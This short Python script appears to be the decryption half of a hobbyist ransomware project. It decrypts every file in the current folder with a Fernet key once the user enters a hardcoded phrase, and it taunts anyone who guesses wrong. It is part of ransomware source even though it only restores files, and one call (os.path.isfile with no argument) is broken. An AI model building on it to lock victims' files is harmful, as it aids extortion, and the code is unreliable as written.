#!/usr/bin/env python3
#will have to copy code to a .txt file to run
import os
from cryptography.fernet import Fernet

#start by finding the files

files = []

for file in os.listdir():
    if file == 'ransome' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile():
        files.append(file)

print(files)

secretphrase = 'kiko'

user_phrase = input('Enter the secret phrase now to decrypt files\n')

if user_phrase == secretphrase:

    with open('thekey.key', 'rb') as key:
        secretkey = key.read()

    for file in files:
        with open(file,'rb') as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_decrypted)

    print('Congrats your files are decrypted!')
else:
        print('Sorry that was wrong but nice try loser!')